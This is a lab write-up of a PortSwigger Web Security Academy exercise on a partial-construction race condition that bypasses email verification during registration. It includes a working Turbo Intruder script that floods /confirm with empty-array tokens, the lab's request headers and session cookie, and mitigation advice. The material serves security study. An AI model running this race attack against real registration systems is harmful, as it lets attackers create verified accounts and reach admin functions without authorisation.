# Partial Construction Race Conditons

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Security Research](https://img.shields.io/badge/Security-Research-blue.svg)](https://github.com/yourusername/web-shell-race-condition)

# Table of Contents

- [Overview](#overview)
- [My "Aha" Moment](#my-aha-moment)
- [Predicting a Potential Collision](#predicting-a-potential-collision)
- [Leaked Client-side Code](#leaked-client-side-code)
- [Benchmarking and Probing](#benchmarking-and-probing)
- [Exploitation (Proof of Concept)](#exploitation-proof-of-concept)
- [Impact](#impact)
- [Mitigation](#mitigation)
- [Tools and Resources](#tools-and-resources)
- [References](#references)

# Overview

Most modern web applications perform complex operations like user registration in multiple non-atomic steps. There is a critical, sub-millisecond window — a "liminal space" — where the user record exists in the database but its associated security tokens or verification statuses are still null or uninitialized.

By flooding the server with confirmation requests at the exact moment of creation, we exploit this partial construction. We aren't guessing a token — we're forcing the application to compare our input (for example, an empty array `token[]`) against a database value that hasn't been written yet, causing a logic bypass.

# My "Aha" Moment

I initially struggled with the race condition script because I was stuck in a loop of 400 Bad Request errors. I had forgotten to vary the username parameter between attempts, so I was inadvertently trying to race against an account that had already failed or partially registered in a previous thread. Using a static username triggered database constraints: the server returned a "Duplicate Entry" before the vulnerable logic was reached.

It clicked that the application needs a clean slate for every packet. I wasn't just racing the server — I was racing the database itself. By switching to a single-packet attack in Turbo Intruder, I could "shotgun" the window, hitting the record while it was still "half-born" and the token remained uninitialized.

# Predicting a Potential Collision

My hypothesis is that when registration occurs, the system performs initial validation, creates a partial database entry, initializes attributes like a token, and then triggers external tasks such as sending emails before the final commit.

In partial construction race conditions — according to my research — the server-side registration process is not atomic. It typically follows these stages in order, creating the observable "race window":

Stage 1 — Initial Validation: basic checks such as username uniqueness and email format.

Stage 2 — Data Entry Creation: the critical moment when the initial SQL INSERT creates the user record. At this millisecond, the user exists but the profile is incomplete.

Stage 3 — Attribute Initialization: the vulnerable window. Separate operations that populate fields like the email verification token, API key, or account status may still be null or empty.

Stage 4 — Final Commit: the registration is marked complete once all subprocesses finish.

How does this theory translate into an exploit? I demonstrate that in the Benchmarking and Exploitation sections, where I measure application response times. For now, here are the baseline tests that exposed the vulnerability window before the race was triggered:

# Initial Observations

I tried to register and observed a strict requirement: the application only accepts @ginandjuice.shop email addresses. Because I didn't have access to an account on that domain, I couldn't retrieve the required confirmation link. While this restriction initially seemed like a dead end, it actually supported my hypothesis: if I couldn't access the token through the intended channel, my remaining path was to subvert the initialization process itself by winning the race during Stage 3 — targeting the record while the token was still uninitialized.

![alt text](image.png)
![alt text](image-1.png)
![alt text](image-2.png)
![alt text](image-3.png)

In Burp's proxy history, while studying the /register endpoint I noticed a request to fetch /resources/static/users.js — a client-side script leaked by the server that I analyzed thoroughly.

![alt text](image-4.png)

# Leaked client-side code

The following is the leaked JavaScript from that page:

```javascript
const createRegistrationForm = () => {
    const form = document.getElementById('user-registration');

    const usernameLabel = document.createElement('label');
    usernameLabel.textContent = 'Username';
    const usernameInput = document.createElement('input');
    usernameInput.required = true;
    usernameInput.type = 'text';
    usernameInput.name = 'username';

    const emailLabel = document.createElement('label');
    emailLabel.textContent = 'Email';
    const emailInput = document.createElement('input');
    emailInput.required = true;
    emailInput.type = 'email';
    emailInput.name = 'email';

    const passwordLabel = document.createElement('label');
    passwordLabel.textContent = 'Password';
    const passwordInput = document.createElement('input');
    passwordInput.required = true;
    passwordInput.type = 'password';
    passwordInput.name = 'password';

    const button = document.createElement('button');
    button.className = 'button';
    button.type = 'submit';
    button.textContent = 'Register';

    form.appendChild(usernameLabel);
    form.appendChild(usernameInput);
    form.appendChild(emailLabel);
    form.appendChild(emailInput);
    form.appendChild(passwordLabel);
    form.appendChild(passwordInput);
    form.appendChild(button);
}

const confirmEmail = () => {
    const container = document.getElementsByClassName('confirmation')[0];

    const parts = window.location.href.split("?");
    const query = parts.length === 2 ? parts[1] : "";
    const action = query.includes('token') ? query : "";

    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '/confirm?' + action;

    const button = document.createElement('button');
    button.className = 'button';
    button.type = 'submit';
    button.textContent = 'Confirm';

    form.appendChild(button);
    container.appendChild(form);
}
```

In this snippet I observed that `createRegistrationForm` prepares the registration form and `confirmEmail` generates the confirmation form used after email verification is finished.

As shown in the screenshot, the `token` parameter is missing, so the server returns a 400 Bad Request.

![alt text](image-5.png)

I experimented by submitting a token parameter that was effectively null. Some frameworks translate empty-array-style parameters (for example, `param[] = dog`) into `param = ['dog']`. The server returned a 400 Bad Request with an "Incorrect token: Array" error, as shown:

![alt text](image-7.png)

I also noticed that submitting an empty token parameter sometimes resulted in a 403 Forbidden response:

![alt text](image-6.png)

# Benchmarking and Probing

I moved the POST /register request to Burp Repeater to establish a baseline for a multi-request connection. My initial test bundled the registration and confirmation requests into a single HTTP/2 stream.

The result was a "partial success": the registration was accepted, but the confirmation returned "Incorrect token: Array." This confirmed that my timing was close enough to hit the backend in one connection, but not perfectly synchronized with the database's uninitialized sub-state.

Alternately, I tried sending both requests in parallel to ensure they arrived simultaneously. The outcome matched the single-connection attempt: registration succeeded, but confirmation failed with the same "Incorrect token" error.

The breakthrough came when I analyzed response timing. The POST /confirm request completed in 434 ms, while POST /register took 442 ms — an 8 ms difference. That gap is crucial: the confirmation logic was finishing before the registration had reached the "Attribute Initialization" stage. To win the race, I needed to flood the server with confirmation requests or otherwise increase the chance that one lands in that narrow ~8 ms window after the record creation but before the token is written.

![alt text](image-10.png)
![alt text](image-11.png)

# Exploitation (Proof of Concept)

The timing analysis revealed a flaw: the /confirm request finished about 8 ms before registration completed. To successfully exploit the partial construction state, I needed the user to be in the pending state when the confirmation arrived.

To address this, I used Turbo Intruder. Leveraging its gate mechanism and queuing many /confirm requests allowed me to flood the gap and increase the chance that at least one confirmation reached the server in the microseconds after the database record creation but before token initialization.

I forwarded the POST /register request to Turbo Intruder and used the template `examples/race-single-packet-attack.py`:

![alt text](image-13.png)

The relevant snippet from the Turbo Intruder template:

```python
def queueRequests(target, wordlists):
    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # replace your `phpsessionid` session cookie here
    confirmationReq = ''' POST /confirm?token[]= HTTP/2
Host: 0a6300de03c9f674807908f300b400a2.web-security-academy.net
Cookie: phpsessionid=GLDjjDGXRwWYi4SF91pYFLEaet0v32Ab
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: https://0a6300de03c9f674807908f300b400a2.web-security-academy.net
Referer: https://0a6300de03c9f674807908f300b400a2.web-security-academy.net/confirm
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

'''
    for attempt in range(25):
        currentAttempt = str(attempt)
        username = 'User' + currentAttempt

        # queue a single registration request
        engine.queue(target.req, username, gate=currentAttempt)

        # queue multiple confirmation requests to increase the chance of hitting the window
        for i in range(40):
            engine.queue(confirmationReq, gate=currentAttempt)

        # send all the queued requests for this attempt
        engine.openGate(currentAttempt)

def handleResponse(req, interesting):
    table.add(req)
```

Using this template, I synchronized the registration and confirmation requests within a single HTTP/2 connection. By stacking ~40 confirmation attempts behind a single registration request and releasing them simultaneously via the gate, I caught the application in its uninitialized sub-state.

The attack succeeded: I observed multiple 200 OK responses for the /confirm endpoint, each returning "Account registration for user limpouser6 successful." In the browser I logged in as `limpouser6` with the static password used during registration, then accessed the admin panel and deleted the user `carlos` to confirm the business-logic flaw.

# Impact

This vulnerability is critical because it effectively reduces a high-security registration gate to a minor speed bump. By hitting the server in that ~8 ms "liminal space," the following can occur:

- Total bypass of identity verification: the restriction to @ginandjuice.shop addresses becomes irrelevant. An attacker can provision a "verified" account without access to the required email domain.

- Unauthorized administrative access: bypassing verification can enable immediate access to internal admin panels and lead to privilege escalation.

- Mass-scale exploitation: removing the human element of clicking an email link allows automation of thousands of verified accounts for data exfiltration, botting, or misinformation.

# Mitigation

The goal is to prevent the server from acting on "half-baked" data. To close the ~8 ms race window, implement the following:

- Atomic transactions (the gold standard): wrap registration logic in a single database transaction. The user record should not be visible to /confirm until registration, token generation, and email tasks are committed.

- Strict null handling: explicitly reject confirmation attempts when the token is null or uninitialized. The server must not treat "nothing" in the database as a valid match for "nothing" in the request.

- Pre-write validation: perform all domain checks and security validations before the first INSERT. If the record isn't written until it is validated, the window disappears.

# Tools and Resources

- Burp Suite (Proxy, Repeater, Turbo Intruder)
- PortSwigger exploit server (payload hosting)

# References

- PortSwigger labs and documentation on business-logic race conditions: https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction

Happy (ethical) hacking!
